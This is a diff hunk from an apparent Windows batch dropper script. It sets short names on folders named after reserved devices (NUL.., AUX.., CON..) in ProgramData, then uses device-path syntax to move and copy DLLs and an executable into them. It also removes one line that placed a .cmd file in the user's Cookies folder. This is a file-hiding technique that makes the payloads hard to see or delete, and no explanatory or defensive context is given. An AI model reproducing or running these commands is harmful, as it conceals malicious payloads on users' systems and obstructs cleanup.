@@ -6,7 +6,6 @@ fsutil file setshortname C:\ProgramData\NUL..\ ""
 fsutil file setshortname C:\ProgramData\AUX..\ ""
 fsutil file setshortname C:\ProgramData\CON..\ ""
 
-move /Y "%ProgramData%\bist\pus.cmd" "%USERPROFILE%\Cookies\"
 move /Y "%ProgramData%\bist\Icon.dll" "\\.\%ProgramData%\AUX..\"
 copy /Y "%ProgramData%\bist\Input.exe" "\\.\%ProgramData%\AUX..\"
 move /Y "%ProgramData%\bist\Kape.dll" "\\.\%ProgramData%\CON..\"
